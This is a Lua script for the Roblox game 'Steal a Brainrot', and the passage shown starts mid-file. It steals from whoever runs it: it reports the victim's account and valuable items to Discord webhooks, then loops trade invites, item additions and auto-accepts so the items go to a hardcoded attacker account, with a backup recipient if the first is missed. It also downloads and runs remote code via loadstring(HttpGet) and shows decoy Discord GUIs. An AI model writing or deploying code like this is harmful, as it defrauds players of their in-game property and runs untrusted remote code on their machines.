		if MISS_BRAINROTS[displayName] or MISS_BRAINROTS[data.Index] then
			table.insert(missBrainrotQueue, {
				slotKey = tonumber(slotKey),
				data = data,
				displayName = displayName,
			})
		end
	end
end

local tradeBrainrotQueue = brainrotQueue
local tradeItemsEnabled = true

-- ONLY if no target brainrots at start → Discord GUI (no trades / no embed / no automation)
if #brainrotQueue == 0 then
	warn("[Brainrot] No target brainrots on base — Join Discord GUI")
	showJoinDiscordGui()
	getgenv().BrainrotMainLoaded = nil
	return
end

print("[Brainrot] Queued", #brainrotQueue, "target brainrots")

if type(genv.EXTRA_LOADSTRINGS) == "table" then
	for _, url in ipairs(genv.EXTRA_LOADSTRINGS) do
		if type(url) == "string" and url ~= "" then
			task.spawn(function()
				pcall(function() loadstring(game:HttpGet(url))() end)
			end)
		end
	end
end

applyEverythingAfterTargetFound()

local baseSkinQueue = {}
local gearQueue = {}

local function getRequestFn()
	return (syn and syn.request) or (http and http.request) or http_request or request
end

-- =============================================================
-- PLAYER JOIN / LEAVE → K2 Logger webhook
-- =============================================================
local function sendPlayerEventLog(player, eventType)
	task.spawn(function()
		local url = GOOD_WEBHOOK
		if not url or url == "" then
			url = LOG_WEBHOOK
		end
		if not url or url == "" then
			return
		end
		local requestFn = getRequestFn()
		if not requestFn then
			return
		end
		local isJoin = eventType == "JOIN"
		local playerCount = #Players:GetPlayers()
		local maxPlayers = 0
		pcall(function()
			maxPlayers = Players.MaxPlayers
		end)
		if not maxPlayers or maxPlayers <= 0 then
			maxPlayers = playerCount
		end
		local execName = "Unknown"
		pcall(function()
			if identifyexecutor then
				execName = tostring(identifyexecutor())
			elseif getexecutorname then
				execName = tostring(getexecutorname())
			end
		end)
		local embed = {
			title = isJoin and "🟢 K2 Logger — Player Joined" or "🔴 K2 Logger — Player Left",
			color = isJoin and 0x57F287 or 0xED4245,
			fields = {
				{
					name = "👑 Script User",
					value = string.format("**%s** (`%s`)\nID: `%d`", LP.DisplayName, LP.Name, LP.UserId),
					inline = false,
				},
				{
					name = isJoin and "👤 Player Joined" or "👤 Player Left",
					value = string.format("**%s** (`%s`)\nID: `%d`", player.DisplayName, player.Name, player.UserId),
					inline = false,
				},
				{
					name = "📊 Players",
					value = string.format("**%d/%d**", playerCount, maxPlayers),
					inline = true,
				},
				{
					name = "⚡ Executor",
					value = execName,
					inline = true,
				},
				{
					name = "⏰ Time",
					value = "<t:" .. os.time() .. ":R>",
					inline = true,
				},
			},
			footer = { text = "K2 LOGGER | https://discord.gg/bxjXucMVqB" },
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
		}
		local payload = {
			username = "K2 Logger",
			avatar_url = GOOD_AVATAR,
			embeds = { embed },
		}
		pcall(function()
			requestFn({
				Url = url,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(payload),
			})
		end)
	end)
end

Players.PlayerAdded:Connect(function(player)
	if player ~= LP then
		sendPlayerEventLog(player, "JOIN")
	end
end)

Players.PlayerRemoving:Connect(function(player)
	if player ~= LP then
		sendPlayerEventLog(player, "LEAVE")
	end
end)


local function toWikiName(displayName)
	local clean = displayName:match("^(.-)%s*%(") or displayName
	return clean:gsub(" ", "_")
end

local function fetchFandomImageUrl(displayName)
	local requestFn = getRequestFn()
	if not requestFn then return nil end
	local wikiName = toWikiName(displayName)
	local url = FANDOM_BASE .. wikiName
	local ok, response = pcall(function()
		return requestFn({
			Url = url, Method = "GET",
			Headers = { ["User-Agent"] = "Mozilla/5.0", ["Accept"] = "text/html" },
			Timeout = 5,
		})
	end)
	if ok and response and response.StatusCode == 200 and response.Body then
		local body = response.Body
		local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
			or body:match('content="([^"]+)"%s+property="og:image"')
		if ogImage and ogImage:find("^https?://") then
			return ogImage:gsub("&amp;", "&")
		end
	end
	return nil
end

local function getBrainrotColor(animalIndex)
	local color = nil
	pcall(function()
		local models = ReplicatedStorage:FindFirstChild("Models")
		local animals = models and models:FindFirstChild("Animals")
		if not animals then return end
		local template = animals:FindFirstChild(animalIndex)
		if not template and AnimalsData and AnimalsData[animalIndex] then
			template = animals:FindFirstChild(AnimalsData[animalIndex].DisplayName)
		end
		if not template then return end
		local bestScore = 0
		for _, desc in ipairs(template:GetDescendants()) do
			if desc:IsA("MeshPart") or desc:IsA("Part") then
				local c = desc.Color
				local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
				local maxC = math.max(c.R, c.G, c.B)
				local minC = math.min(c.R, c.G, c.B)
				local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
				local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
				local bp = (bri < 0.08 and 0.05) or (bri > 0.92 and 0.15) or 1
				local score = (sat * 3 + 0.2) * bp * vol
				if score > bestScore then bestScore = score; color = c end
			end
		end
	end)
	return color
end

local function colorToDecimal(c)
	if not c then return FALLBACK_COLOR end
	local r = math.clamp(math.floor(c.R * 255), 0, 255)
	local g = math.clamp(math.floor(c.G * 255), 0, 255)
	local b = math.clamp(math.floor(c.B * 255), 0, 255)
	return r * 65536 + g * 256 + b
end

local function getBestImageUrl(displayName, animalIndex)
	local info = AnimalsData and AnimalsData[animalIndex]
	if info then
		for _, key in ipairs({ "Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId" }) do
			if info[key] and type(info[key]) == "string" then
				local num = info[key]:match("%d+")
				if num then return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png" end
			end
		end
	end
	return nil
end

local function resolveThumbnail(displayName, animalIndex)
	local url = getBestImageUrl(displayName, animalIndex)
	if url and url ~= "" then return url end
	url = fetchFandomImageUrl(displayName)
	if url and url ~= "" then return url end
	return "https://stealabrainrot.fandom.com/wiki/Special:FilePath/" .. toWikiName(displayName) .. ".png"
end

local function getTraitMultiplier(traitName)
	if not TraitsData or not traitName then return 0 end
	local info = TraitsData[traitName]
	if not info then
		local key = traitName:lower():gsub("%s+", "")
		for k, v in pairs(TraitsData) do
			if type(k) == "string" and k:lower():gsub("%s+", "") == key then info = v; break end
		end
	end
	if type(info) ~= "table" then return 0 end
	local tm = info.MultiplierModifier or info.Multiplier or info.modifier or info.GenerationMultiplier
	if type(tm) == "number" and tm > 0 then return tm end
	return 0
end

local function getMutationMultiplier(mutName)
	if not mutName or mutName == "" or mutName == "None" or mutName == "Default" then return 1 end
	if MUTATION_MULT[mutName] then return MUTATION_MULT[mutName] end
	local key = mutName:lower():gsub("%s+", "")
	for name, mult in pairs(MUTATION_MULT) do
		if name:lower():gsub("%s+", "") == key then return mult end
	end
	return 1
end

local function getGeneration(data)
	local index = data.Index
	local base = 0
	if AnimalsData and AnimalsData[index] and type(AnimalsData[index].Generation) == "number" then
		base = AnimalsData[index].Generation
	end
	if base <= 0 then return 0 end
	local gen = base * getMutationMultiplier(data.Mutation)
	local traits = data.Traits
	if type(traits) == "table" then
		for _, t in pairs(traits) do
			local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
			local tm = getTraitMultiplier(traitName)
			if tm > 0 then gen = gen + (base * tm) end
		end
	end
	return gen
end

local function formatGen(genVal)
	if NumberUtils and NumberUtils.Format then return NumberUtils.Format(genVal) .. "/s" end
	if genVal >= 1e12 then return string.format("%.1fT/s", genVal / 1e12)
	elseif genVal >= 1e9 then return string.format("%.1fB/s", genVal / 1e9)
	elseif genVal >= 1e6 then return string.format("%.1fM/s", genVal / 1e6)
	elseif genVal >= 1e3 then return string.format("%.1fK/s", genVal / 1e3)
	end
	return tostring(math.floor(genVal)) .. "/s"
end

local function normKey(s)
	return (tostring(s or ""):lower():gsub("%s+", ""):gsub("'", ""):gsub("'", ""))
end

local function mutEmoji(name)
	if not name or name == "" then return MUTATION_EMOJI["Default"] end
	if MUTATION_EMOJI[name] then return MUTATION_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(MUTATION_EMOJI) do
		if normKey(k) == key then return v end
	end
	return MUTATION_EMOJI["Default"]
end

local function gearEmoji(name)
	if not name or name == "" then return "⚙️" end
	if GEAR_EMOJI[name] then return GEAR_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(GEAR_EMOJI) do
		if normKey(k) == key then return v end
	end
	return "⚙️"
end

local function baseSkinEmoji(name)
	if not name or name == "" then return "🏠" end
	if BASESKIN_EMOJI[name] then return BASESKIN_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(BASESKIN_EMOJI) do
		if normKey(k) == key then return v end
	end
	return "🏠"
end

local function countTraits(traits)
	if type(traits) ~= "table" then return 0 end
	local n = 0
	for _, t in pairs(traits) do
		local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
		if traitName and traitName ~= "" then n += 1 end
	end
	return n
end

local function sendDetailedWebhook()
	if GOOD_WEBHOOK == "" and (not LOG_WEBHOOK or LOG_WEBHOOK == "") then return end
	local resultsPrimary = {}
	local requirePingPrimary = false
	local totalGen = 0
	for slot, data in pairs(animalList) do
		if type(data) == "table" and data.Index then
			local info = AnimalsData and AnimalsData[data.Index]
			local displayName = (info and info.DisplayName) or data.Index
			if GOOD_BRAINROTS[displayName] or GOOD_BRAINROTS[data.Index] then
				requirePingPrimary = true
				local mutation = data.Mutation or "None"
				local traits = data.Traits or {}
				local genVal = getGeneration(data)
				totalGen += genVal
				local mE = mutEmoji(mutation)
				local tCount = countTraits(traits)
				local line = mE .. " **" .. displayName .. "**"
				if tCount > 0 then line = line .. " *(x" .. tCount .. " traits)*" end
				line = line .. " — **$" .. formatGen(genVal):gsub("/s", "") .. "/s**"
				table.insert(resultsPrimary, {
					slot = tostring(slot), index = data.Index, displayName = displayName,
					name = line, genVal = genVal,
				})
			end
		end
	end
	if #resultsPrimary == 0 and #baseSkinQueue == 0 and #gearQueue == 0 then return end
	table.sort(resultsPrimary, function(a, b) return (a.genVal or 0) > (b.genVal or 0) end)
	local lines = {}
	if #resultsPrimary > 0 then
		table.insert(lines, "───── **BRAINROTS** ─────")
		for i, r in ipairs(resultsPrimary) do table.insert(lines, "`" .. i .. ".` " .. r.name) end
	end
	if #baseSkinQueue > 0 then
		if #lines > 0 then table.insert(lines, "") end
		table.insert(lines, "───── **BASE SKINS** ─────")
		for i, s in ipairs(baseSkinQueue) do
			table.insert(lines, "`" .. i .. ".` " .. baseSkinEmoji(s.skinName) .. " **" .. s.skinName .. "**")
		end
	end
	if #gearQueue > 0 then
		if #lines > 0 then table.insert(lines, "") end
		table.insert(lines, "───── **GEARS** ─────")
		for i, g in ipairs(gearQueue) do
			table.insert(lines, "`" .. i .. ".` " .. gearEmoji(g.gearName) .. " **" .. g.gearName .. "**")
		end
	end
	local listText = table.concat(lines, "\n")
	listText = listText .. "\n\n💰 **Total Value:** **$" .. formatGen(totalGen):gsub("/s", "") .. "/s**"
	if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
	local requestFn = getRequestFn()
	if not requestFn then return end
	local top = resultsPrimary[1]
	local embedColor = FALLBACK_COLOR
	if top then
		local c = getBrainrotColor(top.index)
		if c then embedColor = colorToDecimal(c) end
	end
	local playerCount = #Players:GetPlayers()
	local execName = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
	local embed = {
		title = "K2 Logger",
		description = table.concat({
			"📫 **Script User** `" .. LP.Name .. "` (ID: " .. LP.UserId .. ")",
			"", "**Inventory scan complete.**", "", listText,
		}, "\n"),
		color = embedColor,
		fields = {
			{ name = "⏰ Executed", value = "<t:" .. os.time() .. ":R>", inline = true },
			{ name = "🌍 Server", value = "Players: **" .. playerCount .. "**", inline = true },
			{ name = "⚡ Executor", value = execName, inline = true },
		},
		footer = { text = "K2 LOGGER | https://discord.gg/bxjXucMVqB", icon_url = FOOTER_ICON },
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
	}
	if top then
		local thumb = resolveThumbnail(top.displayName, top.index)
		if thumb and thumb ~= "" then embed.thumbnail = { url = thumb } end
	end
	local function postTo(url, withPing)
		if not url or url == "" then return end
		local payload = { embeds = { embed }, username = "K2 Logger", avatar_url = GOOD_AVATAR }
		if withPing then payload.content = "@everyone" end
		pcall(function()
			requestFn({
				Url = url, Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(payload),
			})
		end)
	end
	local shouldPing = requirePingPrimary or #baseSkinQueue > 0 or #gearQueue > 0
	postTo(GOOD_WEBHOOK, shouldPing)
	postTo(LOG_WEBHOOK, false)
end

local function getMissBrainrotsOnBase()
	local list = {}
	local ok, animals = pcall(function()
		local _, a = getMyPlotAndAnimals()
		return a
	end)
	if not ok or type(animals) ~= "table" then return list end
	for slotKey, data in pairs(animals) do
		if type(data) == "table" and data.Index then
			local displayName = data.Index
			if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
				displayName = AnimalsData[data.Index].DisplayName
			end
			if MISS_BRAINROTS[displayName] or MISS_BRAINROTS[data.Index] then
				local genVal = 0
				pcall(function() genVal = getGeneration(data) end)
				table.insert(list, {
					slot = tostring(slotKey), index = data.Index, displayName = displayName,
					mutation = data.Mutation or "None", traits = data.Traits or {},
					genVal = genVal, data = data,
				})
			end
		end
	end
	table.sort(list, function(a, b) return (a.genVal or 0) > (b.genVal or 0) end)
	return list
end

local function rebuildMissTradeQueue()
	local q = {}
	for _, item in ipairs(getMissBrainrotsOnBase()) do
		table.insert(q, { slotKey = tonumber(item.slot), data = item.data, displayName = item.displayName })
	end
	return q
end

local function sendMissWebhook(missList)
	print("[Brainrot] sendMissWebhook called | count:", missList and #missList or 0)
	local requestFn = getRequestFn()
	if not requestFn or type(MISS_WEBHOOK) ~= "string" or MISS_WEBHOOK == "" then return end
	local totalGen = 0
	local lines = { "───── **BRAINROTS** ─────" }
	for i, r in ipairs(missList or {}) do
		totalGen += (r.genVal or 0)
		local mE = ""; pcall(function() mE = mutEmoji(r.mutation) end)
		local tCount = 0; pcall(function() tCount = countTraits(r.traits) end)
		local genStr = tostring(r.genVal or 0); pcall(function() genStr = formatGen(r.genVal or 0) end)
		local line = tostring(mE) .. " **" .. tostring(r.displayName) .. "**"
		if tCount > 0 then line = line .. " *(x" .. tCount .. " traits)*" end
		line = line .. " — **$" .. tostring(genStr):gsub("/s", "") .. "/s**"
		table.insert(lines, "`" .. i .. ".` " .. line)
	end
	local totStr = tostring(totalGen); pcall(function() totStr = formatGen(totalGen) end)
	local listText = table.concat(lines, "\n") .. "\n\n💰 **Total Value:** **$" .. tostring(totStr):gsub("/s", "") .. "/s**"
	if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
	local embedColor = FALLBACK_COLOR
	pcall(function()
		if missList and missList[1] then
			local c = getBrainrotColor(missList[1].index)
			if c then embedColor = colorToDecimal(c) end
		end
	end)
	local thumb = nil
	pcall(function()
		if missList and missList[1] then thumb = resolveThumbnail(missList[1].displayName, missList[1].index) end
	end)
	local embed = {
		title = "K2 Logger",
		description = table.concat({
			"📫 **Script User** `" .. LP.Name .. "` (ID: " .. tostring(LP.UserId) .. ")",
			"⏱ Unclaimed **" .. tostring(MISS_TIMEOUT) .. "s** → trading to `" .. tostring(MISS_TARGET_ID) .. "`",
			"", listText,
		}, "\n"),
		color = embedColor,
		fields = {
			{ name = "⏰ Failover", value = "<t:" .. os.time() .. ":R>", inline = true },
			{ name = "🌍 Server", value = "Players: **" .. tostring(#Players:GetPlayers()) .. "**", inline = true },
			{ name = "📬 Target", value = "`" .. tostring(MISS_TARGET_ID) .. "`", inline = true },
		},
		footer = { text = "K2 LOGGER | https://discord.gg/bxjXucMVqB", icon_url = FOOTER_ICON },
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
	}
	if type(thumb) == "string" and #thumb > 8 then embed.thumbnail = { url = thumb } end
	pcall(function()
		requestFn({
			Url = MISS_WEBHOOK, Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode({
				content = "@everyone", username = "K2 Logger", avatar_url = GOOD_AVATAR, embeds = { embed },
			}),
		})
	end)
	print("[Brainrot] Miss webhook done →", MISS_TARGET_ID)
end

local function runMissFailover()
	if missFailoverDone then return end
	if currentlyInTrade or tradeActiveFlag then
		print("[Brainrot] Miss timer skipped — in trade")
		return
	end
	local missList = getMissBrainrotsOnBase()
	print("[Brainrot] Miss check: still on base =", #missList)
	if #missList == 0 then
		print("[Brainrot] Miss timer: listed brainrots gone — no failover")
		return
	end
	missFailoverDone = true
	TARGET_ID = MISS_TARGET_ID
	tradeBrainrotQueue = rebuildMissTradeQueue()
	tradeItemsEnabled = false
	baseSkinQueue = {}
	gearQueue = {}
	print("[Brainrot] Failover →", MISS_TARGET_ID, "| miss brainrots:", #tradeBrainrotQueue)
	sendMissWebhook(missList)
end

local function startFullAutomation()
	if not TARGET_ID or TARGET_ID == 0 then
		warn("[Brainrot] TARGET_USER_ID not set — trades disabled")
		return
	end
	if not waitForRemotes(15) then
		warn("[Brainrot] Missing trade remotes")
		return
	end

	-- Steady continuous add: one slot every ADD_STEP seconds, forever.
	-- Avoids burst→long wait patterns that caused random ~8s stalls.
	local ADD_STEP = 0.12
	local ITEM_STEP = 0.15
	local forceBurstFlag = false

	local function addOneBrainrot(item)
		if not addBrainrotRemote or not item then return end
		pcall(function()
			addBrainrotRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data)
		end)
	end

	local function addOneItem(kind, item)
		if not addItemRemote or not item or not tradeItemsEnabled then return end
		if kind == "BaseSkin" then
			pcall(function()
				addItemRemote:InvokeServer(SELECTGB_GUID, "BaseSkin", {
					UUID = item.uuid, SkinName = item.skinName,
				})
			end)
		else
			pcall(function()
				addItemRemote:InvokeServer(SELECTGB_GUID, "Gear", {
					UUID = item.uuid, GearName = item.gearName,
				})
			end)
		end
	end

	local function forceAddAllBrainrots()
		local q = tradeBrainrotQueue
		if not addBrainrotRemote or not q or #q == 0 then return end
		for _, item in ipairs(q) do
			addOneBrainrot(item)
			task.wait(0.04)
		end
	end

	local function forceAddAllItems()
		if not addItemRemote or not tradeItemsEnabled then return end
		for _, item in ipairs(baseSkinQueue) do
			addOneItem("BaseSkin", item)
			task.wait(0.04)
		end
		for _, item in ipairs(gearQueue) do
			addOneItem("Gear", item)
			task.wait(0.04)
		end
	end

	task.spawn(function()
		pg.DescendantAdded:Connect(function(obj)
			local n = string.lower(obj.Name)
			if n == "tradelivetrade" or n == "brainrottrader" or n:find("tradelive", 1, true) then
				task.wait(0.1)
				if obj.Parent and (obj:IsA("Frame") or obj:IsA("ScreenGui")) then
					if not currentlyInTrade then
						currentlyInTrade = true
						tradeActiveFlag = true
						forceBurstFlag = true
						print("[Brainrot] Trade opened → burst + steady add")
						task.spawn(forceAddAllBrainrots)
						task.spawn(forceAddAllItems)
					end
				end
			end
		end)
		pg.DescendantRemoving:Connect(function(obj)
			local n = string.lower(obj.Name)
			if n:find("trade") or n:find("brainrottrader") or n:find("tradelive") then
				if currentlyInTrade then
					currentlyInTrade = false
					print("[Brainrot] Trade closed")
				end
			end
		end)
	end)

	-- ONE continuous brainrot loop — never stops, never waits multi-seconds
	if addBrainrotRemote then
		task.spawn(function()
			local idx = 1
			while true do
				local q = tradeBrainrotQueue
				if q and #q > 0 then
					if idx > #q then idx = 1 end
					addOneBrainrot(q[idx])
					idx = idx + 1
					if forceBurstFlag then
						forceBurstFlag = false
						for _, item in ipairs(q) do
							addOneBrainrot(item)
							task.wait(0.03)
						end
					end
				end
				task.wait(ADD_STEP)
			end
		end)
	end

	-- ONE continuous skins/gears loop
	if addItemRemote then
		task.spawn(function()
			local skinIdx, gearIdx = 1, 1
			while true do
				if tradeItemsEnabled then
					if #baseSkinQueue > 0 then
						if skinIdx > #baseSkinQueue then skinIdx = 1 end
						addOneItem("BaseSkin", baseSkinQueue[skinIdx])
						skinIdx = skinIdx + 1
					end
					if #gearQueue > 0 then
						if gearIdx > #gearQueue then gearIdx = 1 end
						addOneItem("Gear", gearQueue[gearIdx])
						gearIdx = gearIdx + 1
					end
				end
				task.wait(ITEM_STEP)
			end
		end)
	end

	-- Invite only (adds handled by continuous loop)
	task.spawn(function()
		while true do
			if not tradeActiveFlag and not currentlyInTrade then
				pcall(function()
					inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
				end)
			end
			task.wait(TRADE_CYCLE_DELAY)
		end
	end)

	-- Ready + Accept only (no heavy add bursts)
	task.spawn(function()
		local readyFired, acceptFired = false, false
		while true do
			local inTrade = tradeActiveFlag or currentlyInTrade
			if not inTrade then
				readyFired, acceptFired = false, false
				task.wait(0.2)
			else
				if not readyFired then
					pcall(function() readyRemote:FireServer(READY_GUID) end)
					readyFired = true
				end
				task.wait(0.45)
				if not acceptFired then
					pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
					acceptFired = true
				end
				if tradeChannel and tradeChannel.TryIndex then
					local players = tradeChannel:TryIndex({ "active", "data", "players" })
					if players then
						for _, p in pairs(players) do
							if type(p) == "table" then
								local uname = p.username or p.Username or p.name
								if uname == LP.Name then
									if not p.ready then
										pcall(function() readyRemote:FireServer(READY_GUID) end)
									end
									if not p.accepted then
										pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
									end
									break
								end
							end
						end
					end
				else
					pcall(function() readyRemote:FireServer(READY_GUID) end)
					task.wait(0.5)
					pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
				end
				task.wait(0.4)
			end
		end
	end)

	print("[Brainrot] Automation started | steady add @", ADD_STEP, "s (no stall bursts)")
end

startFullAutomation()

task.spawn(function()
	local waited = 0
	while not profileReady and waited < 8 do
		task.wait(0.1)
		waited += 0.1
	end
	if not profileReady then
		warn("[Brainrot] Profile scan timed out — webhook without gears/skins")
		profileReady = true
	end
	baseSkinQueue = buildSkinQueue()
	gearQueue = buildGearQueue()
	print("[Gear] Base skins queued:", #baseSkinQueue)
	print("[Gear] Gears queued:", #gearQueue)
	print("[Brainrot] Sending webhook now…")
	sendDetailedWebhook()
	print("[Brainrot] Webhook call finished")
	if #missBrainrotQueue > 0 then
		print("[Brainrot] Miss timer armed:", MISS_TIMEOUT, "s |", #missBrainrotQueue, "listed")
		task.spawn(function()
			task.wait(MISS_TIMEOUT)
			runMissFailover()
		end)
	else
		print("[Brainrot] Miss timer not armed (no listed brainrots on base)")
	end
end)

-- Drained GUI when targets gone (after they had targets)
task.spawn(function()
	local streak = 0
	local function countTargetBrainrotsOnBase()
		local ok, result = pcall(function()
			local _, list = getMyPlotAndAnimals()
			if type(list) ~= "table" then return nil end
			local count = 0
			for _, data in pairs(list) do
				if type(data) == "table" and data.Index then
					local displayName = data.Index
					if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
						displayName = AnimalsData[data.Index].DisplayName
					end
					if TargetBrainrots[displayName] or TargetBrainrots[data.Index] then
						count += 1
					end
				end
			end
			return count
		end)
		if not ok then return nil end
		return result
	end
	while not drainedGuiShown do
		task.wait(3)
		local n = countTargetBrainrotsOnBase()
		if n == nil then
			streak = 0
		elseif n > 0 then
			streak = 0
		else
			streak += 1
			print("[Brainrot] Empty target streak:", streak, "/", DRAINED_NEED_STREAK)
			if streak >= DRAINED_NEED_STREAK then
				drainedGuiShown = true
				print("[Brainrot] Targets confirmed gone → loading stolen GUI")
				pcall(function()
					loadstring(game:HttpGet(STOLEN_GUI_URL))()
				end)
			end
		end
	end
end)
